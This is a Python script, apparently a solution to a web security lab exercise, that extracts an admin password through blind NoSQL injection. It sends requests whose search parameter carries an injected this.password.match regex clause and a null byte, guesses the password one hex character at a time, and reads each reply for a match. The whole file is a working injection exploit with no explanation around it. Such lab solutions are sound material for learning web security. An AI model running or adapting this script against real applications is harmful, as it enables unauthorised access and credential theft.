import requests
import re

def main():
  password = "" 
  possible_chars = "abcdef0123456789-"
  #proxies = {'http':'http://127.0.0.1', 'https':'https://127.0.0.1'}
  proxies = ""

  i = 0
  while True:
    current_char = possible_chars[i]
    url = f"http://ptl-bd1cf78d-1b176779.libcurl.so/?search=admin'%26%26this.password.match(/^{password}{current_char}.*$/)%00"
    url_completion = f"http://ptl-bd1cf78d-1b176779.libcurl.so/?search=admin'%26%26this.password.match(/^{password}{current_char}$/)%00"
    response = requests.get(url, proxies=proxies)
    text = response.text
    pattern = r"<a href=\"\?search=admin\">admin</a>"
    match = re.search(pattern, text)
    if match:
      password += current_char 
      response = requests.get(url_completion, proxies=proxies)
      text = response.text
      match = re.search(pattern, text)
      if match:
        print(f"The password is {password}")
        break
      i = 0
      print(password, flush=True)
    else:
      i += 1

if __name__ == "__main__":
  main()

